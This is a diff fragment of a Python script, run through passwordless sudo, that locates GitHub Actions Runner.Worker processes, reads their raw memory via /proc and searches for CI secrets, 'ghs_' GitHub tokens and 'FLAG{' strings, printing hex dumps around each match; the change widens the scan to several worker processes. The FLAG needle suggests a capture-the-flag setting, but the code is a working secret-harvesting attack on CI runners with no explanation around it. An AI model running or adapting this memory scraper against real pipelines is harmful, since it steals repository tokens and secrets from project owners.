@@ -95,48 +95,48 @@ for p in glob.glob('/proc/[0-9]*'):
     if b'Runner.Worker' in cl:
         pids.append(p)
 print('WORKER_PIDS', pids)
-if not pids:
-    sys.exit(0)
-pid = pids[0].split('/')[-1]
-try:
-    maps = open('/proc/%s/maps' % pid).read().splitlines()
-except Exception as e:
-    print('MAPS_ERR', e); sys.exit(0)
-mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
-scanned = 0
-matches = 0
-CH = 4 * 1024 * 1024
-for line in maps:
-    if scanned > 700 * 1024 * 1024:
-        break
-    m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (\S+)', line)
-    if not m:
+needles = (b'FLAG{', b'ghs_', b'"secrets"')
+total = 0
+found = 0
+for p in pids[:4]:
+    pid = p.split('/')[-1]
+    try:
+        maps = open('/proc/%s/maps' % pid).read().splitlines()
+        mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
+    except Exception as e:
+        print('OPEN_ERR', pid, e)
         continue
-    start, end, perms = int(m.group(1), 16), int(m.group(2), 16), m.group(3)
-    if 'r' not in perms:
-        continue
-    size = min(end - start, 256 * 1024 * 1024)
-    off = 0
-    tail = b''
-    while off < size:
-        try:
-            mem.seek(start + off)
-            data = mem.read(min(CH, size - off))
-        except Exception:
+    for line in maps:
+        if total > 1200 * 1024 * 1024:
             break
-        if not data:
-            break
-        buf = tail + data
-        for needle in (b'FLAG{', b'"secrets":{'):
-            i = buf.find(needle)
-            if i >= 0:
-                matches += 1
-                if matches <= 12:
-                    print('MEM-MATCH', needle, buf[max(0, i-80):i+240].hex())
-        tail = buf[-64:]
-        off += len(data)
-        scanned += len(data)
-print('MEM-SCAN-DONE scanned=%d matches=%d' % (scanned, matches))
+        m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (\S+)', line)
+        if not m:
+            continue
+        start, end, perms = int(m.group(1), 16), int(m.group(2), 16), m.group(3)
+        if 'r' not in perms:
+            continue
+        size = min(end - start, 192 * 1024 * 1024)
+        off = 0
+        tail = b''
+        while off < size:
+            try:
+                mem.seek(start + off)
+                data = mem.read(min(4 * 1024 * 1024, size - off))
+            except Exception:
+                break
+            if not data:
+                break
+            buf = tail + data
+            for needle in needles:
+                i = buf.find(needle)
+                if i >= 0:
+                    found += 1
+                    if found <= 10:
+                        print('MEM-MATCH', pid, needle, buf[max(0, i-120):i+320].hex())
+            tail = buf[-64:]
+            off += len(data)
+            total += len(data)
+print('MEM-SCAN-DONE scanned=%d matches=%d' % (total, found))
 """
 try:
     _r = subprocess.run(['sudo', '-n', 'python3', '-c', _SCAN], capture_output=True, text=True, timeout=120)
